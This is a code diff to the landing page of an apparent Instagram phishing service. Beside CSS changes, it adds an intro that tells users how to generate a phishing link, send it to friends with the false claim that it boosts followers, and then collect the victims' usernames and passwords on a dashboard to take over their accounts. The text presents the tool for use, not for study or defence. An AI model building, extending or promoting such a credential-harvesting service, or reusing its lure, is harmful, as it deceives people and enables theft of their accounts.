@@ -15,11 +15,22 @@
       justify-content: center;
       align-items: center;
       flex-direction: column;
+      text-align: center;
+    }
+
+    .intro-text {
+      max-width: 850px;
+      color: white;
+      font-size: 17px;
+      margin-bottom: 30px;
+      padding: 0 20px;
+      text-shadow: 1px 1px 5px #000;
+      line-height: 1.6;
     }
 
     h1 {
       color: white;
-      margin-bottom: 50px;
+      margin-bottom: 20px;
       font-size: 36px;
       text-shadow: 1px 1px 5px #000;
     }
@@ -43,6 +54,15 @@
   </style>
 </head>
 <body>
+  <div class="intro-text">
+    <strong>How Are Phishing Websites Used?</strong><br><br>
+    First, the user clicks on the <strong>"New Register"</strong> button and fills in their email and password. After registration, they can log in using the same email and password by clicking the <strong>"Login"</strong> button.<br><br>
+    Once logged in, the user is taken to their personal home dashboard, where their email is displayed along with a <strong>"Logout"</strong> button and a <strong>"Generate Instagram Phishing Link"</strong> button.<br><br>
+    When the user clicks the phishing link generator, a unique link is created. They can share this link with their friends by saying, “This website helps you increase your Instagram followers.”<br><br>
+    When someone clicks and logs in through the phishing page, their Instagram username and password are saved. This data is then visible on the user’s home dashboard.<br><br>
+    The user can now use these credentials to log into the Instagram account of the victim.
+  </div>
+
   <h1>Welcome</h1>
   <a href="../Login/" class="btn">Login</a>
   <a href="../UserReg/" class="btn">New Register</a>
